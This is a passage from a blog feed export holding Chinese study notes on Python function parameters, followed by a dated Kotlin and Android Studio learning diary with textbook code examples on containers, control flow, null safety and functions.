class="number">4</span>&#125;</span><br></pre></td></tr></table></figure><p>对于不变对象来说，调用对象自身的任意方法，也不会改变该对象自身的内容。相反，这些方法会创建新的对象并返回，这样，就保证了不可变对象本身永远是不可变的。使用key-value存储结构的dict在Python中非常有用，选择不可变对象作为key很重要，最常用的key是字符串。</p><p>函数名其实就是指向一个函数对象的引用，完全可以把函数名赋给一个变量，相当于给这个函数起了一个“别名”：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="built_in">abs</span> <span class="comment"># 变量a指向abs函数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a(-<span class="number">1</span>) <span class="comment"># 所以也可以通过a调用abs函数</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>Python函数在定义的时候，默认参数L的值就被计算出来了，即[]，因为默认参数L也是一个变量，它指向对象[]，每次调用该函数，如果改变了L的内容，则下次调用时，默认参数的内容就变了，不再是函数定义时的[]了。<strong>定义默认参数要牢记一点：默认参数必须指向不变对象！</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_end</span>(<span class="params">L=[]</span>):</span><br><span class="line">    L.append(<span class="string">&#x27;END&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> L</span><br></pre></td></tr></table></figure><p>可变参数：定义可变参数和定义一个list或tuple参数相比，仅仅在参数前面加了一个<code>*</code>号。在函数内部，参数numbers接收到的是一个tuple，因此，函数代码完全不变。但是，调用该函数时，可以传入任意个参数，包括0个参数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">*numbers</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</span><br><span class="line">        <span class="built_in">sum</span> = <span class="built_in">sum</span> + n * n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc()</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p>如果已经有一个list或者tuple，要调用一个可变参数，Python允许你在list或tuple前面加一个<code>*</code>号，把list或tuple的元素变成可变参数传进去。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc(*nums)</span><br><span class="line"><span class="number">14</span></span><br></pre></td></tr></table></figure><p><code>*nums</code>表示把<code>nums</code>这个list的所有元素作为可变参数传进去。</p><p>可变参数允许你传入0个或任意个参数，这些可变参数在函数调用时自动组装为一个tuple。而关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">person</span>(<span class="params">name, age, **kw</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;name:&#x27;</span>, name, <span class="string">&#x27;age:&#x27;</span>, age, <span class="string">&#x27;other:&#x27;</span>, kw)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Adam&#x27;</span>, <span class="number">45</span>, gender=<span class="string">&#x27;M&#x27;</span>, job=<span class="string">&#x27;Engineer&#x27;</span>)</span><br><span class="line">name: Adam age: <span class="number">45</span> other: &#123;<span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>extra = &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, **extra)</span><br><span class="line">name: Jack age: <span class="number">24</span> other: &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p><code>**extra</code>表示把<code>extra</code>这个dict的所有key-value用关键字参数传入到函数的<code>**kw</code>参数，<code>kw</code>将获得一个dict，对<code>kw</code>的改动不会影响到函数外的<code>extra</code>。</p><p>和关键字参数<code>**kw</code>不同，命名关键字参数需要一个特殊分隔符<code>*</code>，<code>*</code>后面的参数被视为命名关键字参数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">person</span>(<span class="params">name, age, *, city, job</span>):</span><br><span class="line">    <span class="built_in">print</span>(name, age, city, job)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, city=<span class="string">&#x27;Beijing&#x27;</span>, job=<span class="string">&#x27;Engineer&#x27;</span>)</span><br><span class="line">Jack <span class="number">24</span> Beijing Engineer</span><br></pre></td></tr></table></figure><p>在Python中定义函数，可以用必选参数、默认参数、可变参数、关键字参数和命名关键字参数，这5种参数都可以组合使用。但是请注意，参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。比如定义一个函数，包含上述若干种参数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f1</span>(<span class="params">a, b, c=<span class="number">0</span>, *args, **kw</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a, <span class="string">&#x27;b =&#x27;</span>, b, <span class="string">&#x27;c =&#x27;</span>, c, <span class="string">&#x27;args =&#x27;</span>, args, <span class="string">&#x27;kw =&#x27;</span>, kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f2</span>(<span class="params">a, b, c=<span class="number">0</span>, *, d, **kw</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a, <span class="string">&#x27;b =&#x27;</span>, b, <span class="string">&#x27;c =&#x27;</span>, c, <span class="string">&#x27;d =&#x27;</span>, d, <span class="string">&#x27;kw =&#x27;</span>, kw)</span><br></pre></td></tr></table></figure><p>在函数调用的时候，Python解释器自动按照参数位置和参数名把对应的参数传进去。</p><p><strong>小结</strong>  </p><p>要注意定义可变参数和关键字参数的语法：</p><p><code>*args</code>是可变参数，<code>args</code>接收的是一个<code>tuple</code>;</p><p><code>**kw</code>是关键字参数，<code>kw</code>接收的是一个<code>dict</code>。</p><p>以及调用函数时如何传入可变参数和关键字参数的语法：</p><p>可变参数既可以直接传入：<code>func(1,2,3)</code>，又可以先组装<code>list</code>或<code>tuple</code>，再通过<code>*args</code>传入：<code>func(*(1,2,3))</code>;</p><p>关键字参数既可以直接传入：<code>func(a=1,b=2)</code>，又可以先组装<code>dict</code>，再通过<code>**kw</code>传入：<code>func(**&#123;&#39;a&#39;:1,&#39;b&#39;:2&#125;)</code>。</p><p>使用<code>*args</code>和<code>**kw</code>是Python的习惯写法，当然也可以用其他参数名，但最好使用习惯用法。</p><p>命名的关键字参数是为了限制调用者可以传入的参数名，同时可以提供默认值。</p><p>定义命名的关键字参数在没有可变参数的情况下不要忘了写分隔符<code>*</code>，否则定义的将是位置参数。</p><p><strong>未完待续……</strong></p>]]></content>
      
      
      <categories>
          
          <category> learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Studio及Kotlin学习笔记</title>
      <link href="/2019/06/29/LearnKotlin/"/>
      <url>/2019/06/29/LearnKotlin/</url>
      
        <content type="html"><![CDATA[<h2 id="Book"><a href="#Book" class="headerlink" title="Book"></a>Book</h2><p>Kotlin从零到精通 Android开发——欧阳燊  </p><p>2018年4月第一版 清华大学出版社  </p><p>书附录源码<a href="https://github.com/aqi00/kotlin">github链接</a> </p><p>资源下载和内容勘误<a href="https://blog.csdn.net/aqi00/article/details/80731717">CSDN链接</a></p><p>书是在学校图书馆借的</p><h2 id="20190628"><a href="#20190628" class="headerlink" title="20190628"></a>20190628</h2><p>第一章搭建Kotlin开发环境，安装过程基本和书上一致。安装AS的时候可以选择不安装virtual device，暂时都是在用自己的手机调试，没有虚拟设备需求。</p><p>安装SDK很方便，也自带了书中提到的Gradle插件。</p><p>Anko库配置的那一部分没有实现，猜测是因为我没有装Jetbrains的东西，不过暂时也没影响。</p><p>对xml布局有了一定了解，好像VB啊……坑的地方就是用可视化工具design出来的布局和实际run起来的布局很多不同，几乎全崩，还得老老实实写xml……</p><p>第二章数据类型，看了基本数据类型及其转换，Nothing Special。</p><h2 id="20190629"><a href="#20190629" class="headerlink" title="20190629"></a>20190629</h2><p>继续第二章数据类型，关于数组的定义和基本方法有所了解。</p><p>插曲：顺手搜了一手怎么打包apk给别人用。</p><p>关于字符串，和基本类型的转换很方便，其中字符串的toBoolean方法只能转换字符串“true”和“false”。</p><p>数组常用的方法有<code>indexOf</code>,<code>substring</code>,<code>replace</code>,<code>split</code>等，其中<code>split</code>方法的结果用<code>List&lt;String&gt;</code>来存。用这几种基本方法可以完成很多操作。（越看越像VB……</p><p>Kotlin中，直接在字符串中加入<code>$变量名</code>即可表示此处引用该变量的值。需要注意的是，这个符号在markdown里看来也是一个神奇的符号，写这一段的时候就乱码了好几次……真正需要注意的是，符号$后面跟变量名，系统会自动匹配最长的变量名；如果在取值之前还要先运算，则需用大括号把运算表达式给括起来；算了不抄书了截个图算了……</p><p><img src="https://img.lfalive.top/LearnKotlin/1.jpg"></p><h2 id="20190630"><a href="#20190630" class="headerlink" title="20190630"></a>20190630</h2><p>继续第二章，容器：集合Set，队列List，映射Map。莫名想起了算法竞赛的时候，使用集合、队列和映射的时候。</p><p>对于变量，val表示该变量不可更改，var表示该变量可更改。容器默认为只读，需要允许修改，就加上<code>Mutable</code> 前缀。所以有<code>MutableSet</code>，<code>MutableList</code>，<code>MutableMap</code>。三者有共同的方法<code>isEmpty</code>，<code>isNotEmpty</code>，<code>clear</code>，<code>contains</code>，<code>interator</code>，<code>count</code>。</p><table><thead><tr><th align="center">容器名称</th><th align="center">初始化方法</th></tr></thead><tbody><tr><td align="center">Set</td><td align="center">setOf</td></tr><tr><td align="center">MutableSet</td><td align="center">mutableSetOf</td></tr><tr><td align="center">List</td><td align="center">listOf</td></tr><tr><td align="center">MutableList</td><td align="center">mutableListOf</td></tr><tr><td align="center">Map</td><td align="center">mapOf</td></tr><tr><td align="center">MutableMap</td><td align="center">mutableMapOf</td></tr></tbody></table><p>集合的遍历，for-in遍历、迭代器遍历、forEach遍历。</p><p>其中迭代器遍历使用得带器的hasNext方法判断是否存在下一个节点,用next方法获得下一个节点的元素。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">r = goodsMutSet.iterator()</span><br><span class="line">    <span class="comment">//如果迭代器还存在下一个节点，则继续取出下一个节点的记录</span></span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;   </span><br><span class="line">    <span class="keyword">val</span> item = iterator.next()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>forEach遍历内部使用it指代每条记录。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">goodsMutSet.forEach &#123; desc = <span class="string">&quot;<span class="subst">$&#123;desc&#125;</span>名称：<span class="subst">$&#123;it&#125;</span>\n&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>集合用得不多，主要用List和Map吧。</p><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>MutableList的add方法把元素加到队尾，set元素修改指定位置的元素，removeAt方法允许删除指定位置的元素。遍历方法和set相同，还多了一种按元素下标循环遍历的方式。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//indices是队列的下标数组。如果队列大小为10，则下标数组的取值为0到9</span></span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> goodsMutList.indices) &#123;</span><br><span class="line"><span class="keyword">val</span> item = goodsMutList[i]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还多了排序方法sortB:   </p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sortBy表示升序排列，后面跟的是排序条件</span></span><br><span class="line">goodsMutList.sortBy &#123; it.length &#125;</span><br><span class="line"><span class="comment">//sortByDescending表示降序排列，后面跟的是排序条件</span></span><br><span class="line">goodsMutList.sortByDescending &#123; it.length &#125;</span><br></pre></td></tr></table></figure><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>常用方法<code>containsKey</code>，<code>containsValue</code>，<code>put</code>(添加元素)，<code>remove</code>(通过键名来删除元素)。</p><p>初始化时，两种方法。一是<code>Pair(键名,键值)</code>，二是<code>键名 to 键值</code>。</p><p>遍历依旧三种方法，注意的是要访问元素的key属性和value属性获得键名或者键值。比如：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> iterator = goodsMutMap.iterator()</span><br><span class="line">    <span class="comment">//如果迭代器还存在下一个节点，则继续取出下一个节点的记录</span></span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">val</span> item = iterator.next()</span><br><span class="line">        desc = <span class="string">&quot;<span class="subst">$&#123;desc&#125;</span>厂家：<span class="subst">$&#123;item.key&#125;</span>，名称：<span class="subst">$&#123;item.value&#125;</span>\n&quot;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>forEach内部使用key指代每条记录的键，使用value指代每条记录的值。  </p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">goodsMutMap.forEach &#123; key, value -&gt; desc = <span class="string">&quot;<span class="subst">$&#123;desc&#125;</span>厂家：<span class="subst">$&#123;key&#125;</span>，名称：<span class="subst">$&#123;value&#125;</span>\n&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>第二章结束。</p><h2 id="20190702"><a href="#20190702" class="headerlink" title="20190702"></a>20190702</h2><p>第三章，控制语句。</p><h3 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h3><p>条件分支最简单，包括两路分支以及多路分支。两路分支的时候，因为if语句允许有返回值，能直接简化为类似于三目运算符的形式。</p><p>多路分支中，when语句必须带上else，when&#x2F;else也允许有返回值。牛逼的是，不用break，处理完一次就直接跳出。还可以引入变量或者具体的运算表达式进行判断，甚至可以是个范围：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">tv_answer.text = <span class="keyword">when</span> (count) &#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span> -&gt; <span class="string">&quot;凉风有信的谜底是“讽”&quot;</span></span><br><span class="line">    <span class="keyword">in</span> <span class="number">13.</span><span class="number">.19</span> -&gt; <span class="string">&quot;秋月无边的谜底是“二”&quot;</span></span><br><span class="line">    !<span class="keyword">in</span> <span class="number">6.</span><span class="number">.10</span> -&gt; <span class="string">&quot;当里的当，少侠你来猜猜&quot;</span></span><br><span class="line">    <span class="keyword">else</span> -&gt; <span class="string">&quot;好诗，这真是一首好诗&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更牛逼的是，还可以进行类型判断……</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countType:Number</span><br><span class="line"><span class="comment">//Long、Double、Float都由Number派生而来</span></span><br><span class="line">countType = <span class="keyword">when</span> (count) &#123;</span><br><span class="line">    <span class="number">0</span> -&gt; count.toLong()</span><br><span class="line">    <span class="number">1</span> -&gt; count.toDouble()</span><br><span class="line">    <span class="keyword">else</span> -&gt; count.toFloat()</span><br><span class="line">&#125;</span><br><span class="line">count = ( count + <span class="number">1</span> ) % <span class="number">3</span>;</span><br><span class="line">tv_answer.text = <span class="keyword">when</span> (countType) &#123;</span><br><span class="line"><span class="keyword">is</span> <span class="built_in">Long</span> -&gt; <span class="string">&quot;此恨绵绵无绝期&quot;</span></span><br><span class="line"><span class="keyword">is</span> <span class="built_in">Double</span> -&gt; <span class="string">&quot;树上的鸟儿成双对&quot;</span></span><br><span class="line"><span class="keyword">else</span> -&gt; <span class="string">&quot;门泊东吴万里船&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>遍历循环有for-in循环和利用indices下标数组的循环。下标数组用法同List。</p><p>关于条件循环，kotlin在for-in循环中提供了until、step、downTo等关键字，但还是很乱很麻烦，所以更灵活的方案还是用do&#x2F;while进行条件循环。</p><p>循环中可以用continue和break。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//发现该行是空串或者空格串，则忽略该行</span></span><br><span class="line">    <span class="keyword">if</span> (poem2Array[pos].isNullOrBlank())</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>我惊呆了，给循环加上@标记，想break几层循环就break几层……</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i:<span class="built_in">Int</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> is_found = <span class="literal">false</span></span><br><span class="line"><span class="comment">//给外层循环加个名叫outside的标记</span></span><br><span class="line"><span class="symbol">outside@</span> <span class="keyword">while</span> (i &lt; poemArray.size) &#123;</span><br><span class="line">    <span class="keyword">var</span> j:<span class="built_in">Int</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">var</span> item = poemArray[i];</span><br><span class="line">    <span class="keyword">while</span> ( j &lt; item.length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (item[j] == <span class="string">&#x27;一&#x27;</span>) &#123;</span><br><span class="line">            is_found = <span class="literal">true</span></span><br><span class="line">            <span class="comment">//发现情况，直接跳出outside循环</span></span><br><span class="line">            <span class="keyword">break</span><span class="symbol">@outside</span></span><br><span class="line">        &#125;</span><br><span class="line">        j++</span><br><span class="line">    &#125;</span><br><span class="line">    i++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="20190704"><a href="#20190704" class="headerlink" title="20190704"></a>20190704</h2><h3 id="空安全"><a href="#空安全" class="headerlink" title="空安全"></a>空安全</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//strA.isNullOrEmpty() //非空串与可空串均可调用</span></span><br><span class="line"><span class="comment">//strA.isNullOrBlank() //非空串与可空串均可调用</span></span><br><span class="line"><span class="comment">//strA.isEmpty() //只有非空串可调用</span></span><br><span class="line"><span class="comment">//strA.isBlank() //只有非空串可调用</span></span><br><span class="line"><span class="comment">//strA.isNotEmpty() //只有非空串可调用</span></span><br><span class="line"><span class="comment">//strA.isNotBlank() //只有非空串可调用</span></span><br></pre></td></tr></table></figure><p>区别是全为空格的串算作Blank而不算Empty。  </p><p>声明可空字符串，加个问号。获取可空串的length要注意避免空指针，Kotlin引入了几种标记。    </p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> strCanNull:String?</span><br><span class="line">length = <span class="keyword">if</span> (strCanNull!=<span class="literal">null</span>) strCanNull.length <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//?.表示对象为空时直接返回null，所以返回值的变量必须被声明为可空类型</span></span><br><span class="line"><span class="keyword">var</span> length_null:<span class="built_in">Int</span>? = strB?.length</span><br><span class="line"></span><br><span class="line"><span class="comment">//?:表示为空时就返回右边的值，即(x!=null)?x.**:y</span></span><br><span class="line">length = strB?.length?: -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//!!表示不做非空判断，强制执行后面的表达式，如果对象为空就会扔出空异常</span></span><br><span class="line"><span class="comment">//所以只有在确保为非空时，才能使用!!</span></span><br><span class="line">length = strB!!.length</span><br></pre></td></tr></table></figure><h3 id="等式判断"><a href="#等式判断" class="headerlink" title="等式判断"></a>等式判断</h3><p>导入样例代码build时，提醒<code>Unresolved reference: Date()</code>，怀疑是anko的问题，于是配置好了anko。然后发现还是不行，搞了半天<code>import java.util.*</code>，就OK了。  </p><p>特点：字符串也可用<code>==</code>和<code>!=</code>来判断相等否（结构相等）。还有另一种更严格的判断是引用相等：意思是除了值相等以外，还要求引用的地址（即储存地址）相等，表达式用<code>===</code>和<code>！==</code>。  </p><p>类型判断:<code>is</code>,<code>!is</code>。检验数组中是否存在某个元素:<code>in</code>,<code>!in</code>。  </p><p>第三章结束。</p><h2 id="20190706"><a href="#20190706" class="headerlink" title="20190706"></a>20190706</h2><p>第四章——函数运用</p><h3 id="函数基本方法"><a href="#函数基本方法" class="headerlink" title="函数基本方法"></a>函数基本方法</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>override在同一行表达重载操作。kotlin默认函数就是公开的，所以省略了关键词”public”。函数若无返回参数，则不用特别说明。关键词”fun”表示函数定义。声明输入参数用“变量名称：变量类型”格式，变量支持空安全机制。</p><p>函数声明返回值用<code>fun main()：Int</code>这种格式，即使不声明，也会有一个Unit类型的对象返回，可直接省略Unit声明。这只是为了让函数定义完全符合变量定义的形式，若需要具体的输入参数，则一样需要在函数里用return关键字来返回参数值。</p><p><strong>默认参数</strong>：在声明输入参数时在其后面加上等号及其默认值。</p><p><strong>命名参数</strong>：给指定的参数赋值。如 <code>getFourBigDefault(second=&quot;活字印刷&quot;)</code>。</p><p><strong>可变参数</strong>：声明参数时用<code>vararg otherArray: String?</code>，<code>vararg</code>表示其后的参数个数不确定，可变参数当成一个数组来解析。So，可以实现可变的数组参数，声明时也要加上<code>vararg</code>前缀，调用时要注意：可输入多个数组变量，每个数组都使用arrayOf定义。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getFourBigArray</span><span class="params">(<span class="keyword">vararg</span> otherArray: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>:String &#123;</span><br><span class="line">        <span class="keyword">var</span> answer:String = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment">//先遍历每个数组</span></span><br><span class="line">        <span class="keyword">for</span> (array <span class="keyword">in</span> otherArray) &#123;</span><br><span class="line">            <span class="comment">//再遍历某个数组中的所有元素</span></span><br><span class="line">            <span class="keyword">for</span> (item <span class="keyword">in</span> array) &#123;</span><br><span class="line">                answer = <span class="string">&quot;<span class="variable">$answer</span>，<span class="variable">$item</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> answer</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="20190710"><a href="#20190710" class="headerlink" title="20190710"></a>20190710</h2><p>先整理一下之前搞的关于打包的技巧，参考了**<a href="https://blog.csdn.net/swer0808/article/details/78999949">这篇博客</a>**。 </p><p>在app的build.gradle中加了以下代码。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//release版本输出包名自动追加版本号和版本名称</span></span><br><span class="line">applicationVariants.all &#123;</span><br><span class="line">    variant -&gt; variant.outputs.all &#123;</span><br><span class="line">        <span class="comment">//只处理生产版本</span></span><br><span class="line">        <span class="keyword">if</span> (buildType.name == <span class="string">&#x27;release&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">def</span> <span class="variable">createTime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>().format(<span class="string">&quot;YYYY-MM-dd&quot;</span>, TimeZone.getTimeZone(<span class="string">&quot;GMT+08:00&quot;</span>))</span><br><span class="line">            <span class="comment">// app包名称</span></span><br><span class="line">            outputFileName = <span class="string">&quot;app_v&quot;</span> + defaultConfig.versionName + <span class="string">&quot;_&quot;</span> + createTime + <span class="string">&quot;_&quot;</span> + buildType.name + <span class="string">&quot;.apk&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="几种特殊函数"><a href="#几种特殊函数" class="headerlink" title="几种特殊函数"></a>几种特殊函数</h3><p>注：Kotlin允许定义全局函数，即函数可在单独的kt文件中定义，然后其他地方也能直接调用。<br><strong>泛型函数</strong>：在函数名称前面添加<code>&lt;T&gt;</code>，表示以T声明的参数，其参数类型必须在函数调用时指定。把T换成其他的都行，只要前后对应。如：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="type">&lt;R&gt;</span> <span class="title">appendString</span><span class="params">(tag:<span class="type">String</span>, <span class="keyword">vararg</span> otherInfo: <span class="type">R</span>?)</span></span>:String &#123;&#125;</span><br></pre></td></tr></table></figure><p><strong>内联函数</strong>：<code>fun setArrayNumber(array:Array&lt;Number&gt;) &#123;&#125;</code>不接受<code>Array&lt;Int&gt;</code>或者<code>Array&lt;Double&gt;</code>的入参，得指定泛型变量T来自于基类Number，即将T改为<code>&lt;reified T:Number&gt;</code>，同时在<code>fun</code>前面添加关键字<code>inline</code>。如：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;<span class="keyword">reified</span> T : Number&gt;</span> <span class="title">setArrayStr</span><span class="params">(array:<span class="type">Array</span>&lt;<span class="type">T</span>&gt;)</span></span> &#123;&#125;</span><br><span class="line"><span class="comment">//该函数调用时入参可为Int、Long、Double、Float类型数组。</span></span><br></pre></td></tr></table></figure><p><strong>简化函数</strong>：Kotlin把函数当作一种特殊变量，则允许通过等号给函数这个变量进行赋值。所以阶乘函数如下：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">factorial</span><span class="params">(n:<span class="type">Int</span>)</span></span>:<span class="built_in">Int</span> = <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) n <span class="keyword">else</span> n* factorial(n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>尾递归函数</strong>：指函数末尾的返回值重复调用了自身函数，要在<code>fun</code>前面加上关键字<code>tailrec</code>。如：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">tailrec</span> <span class="function"><span class="keyword">fun</span> <span class="title">findFixPoint</span><span class="params">(x: <span class="type">Double</span> = <span class="number">1.0</span>)</span></span>: <span class="built_in">Double</span></span><br><span class="line">    = <span class="keyword">if</span> (x == Math.cos(x)) x <span class="keyword">else</span> findFixPoint(Math.cos(x))</span><br></pre></td></tr></table></figure><p><strong>高阶函数</strong>：允许将函数表达式作为输入参数传进来，就形成了高阶函数。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//允许将函数表达式作为输入参数传进来，就形成了高阶函数，这里的greater函数就像是个变量。</span></span><br><span class="line"><span class="comment">//greater函数有两个输入参数，返回布尔型的输出参数。</span></span><br><span class="line"><span class="comment">//调用时第二个参数时用大括号包了起来，这是Lambda表达式的匿名函数写法。中间的&#x27;-&gt;&#x27;把匿名函数分为两个部分，前是入参，后是函数体。如果第一个参数大于第二个参数，则认为greater返回true，否则返回false。</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="type">&lt;T&gt;</span> <span class="title">maxCustom</span><span class="params">(array: <span class="type">Array</span>&lt;<span class="type">T</span>&gt;, greater: (<span class="type">T</span>, <span class="type">T</span>) -&gt; <span class="type">Boolean</span>)</span></span>: T? &#123;</span><br><span class="line">    <span class="keyword">var</span> max: T? = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">for</span> (item <span class="keyword">in</span> array)</span><br><span class="line">        <span class="keyword">if</span> (max == <span class="literal">null</span> || greater(item, max))</span><br><span class="line">            max = item</span><br><span class="line">    <span class="keyword">return</span> max</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用如下：</span></span><br><span class="line">maxCustom&lt;String&gt;(string_array, &#123; a, b -&gt; a.length &gt; b.length &#125;)</span><br></pre></td></tr></table></figure><p>插一段关于<a href="https://blog.csdn.net/xiangzhihong8/article/details/78666883">Kotlin 包和 import 语句使用</a>,复制样例代码到测试工程中时遇到了这个报错，因为import的package和包里声明的package以及文件目录表示的package三者不匹配。</p><h3 id="增强系统函数"><a href="#增强系统函数" class="headerlink" title="增强系统函数"></a>增强系统函数</h3><p><strong>扩展函数</strong>：例子如下：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//扩展函数结合泛型函数，能够更好地扩展函数功能</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="type">&lt;T&gt;</span> Array<span class="type">&lt;T&gt;</span>.<span class="title">swap</span><span class="params">(pos1: <span class="type">Int</span>, pos2: <span class="type">Int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> tmp = <span class="keyword">this</span>[pos1] <span class="comment">//this表示数组对象自身</span></span><br><span class="line">    <span class="keyword">this</span>[pos1] = <span class="keyword">this</span>[pos2]</span><br><span class="line">    <span 